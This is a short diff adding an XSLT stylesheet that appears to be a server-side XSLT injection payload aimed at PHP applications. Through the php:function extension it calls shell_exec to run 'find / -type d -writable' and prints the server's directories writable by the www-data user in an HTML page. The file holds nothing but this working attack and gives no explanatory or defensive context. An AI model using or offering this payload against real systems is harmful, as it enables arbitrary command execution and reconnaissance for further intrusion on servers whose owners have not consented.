@@ -1,0 +1,17 @@
+<?xml version="1.0"?>
+<xsl:stylesheet version="1.0"
+  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+  xmlns:php="http://php.net/xsl">
+
+  <xsl:template match="*">
+    <html>
+      <body>
+        <h2>Writable directories by www-data</h2>
+        <pre>
+          <xsl:value-of select="php:function('shell_exec', 'find / -type d -writable 2>/dev/null | grep -v /proc')" />
+        </pre>
+      </body>
+    </html>
+  </xsl:template>
+
+</xsl:stylesheet>
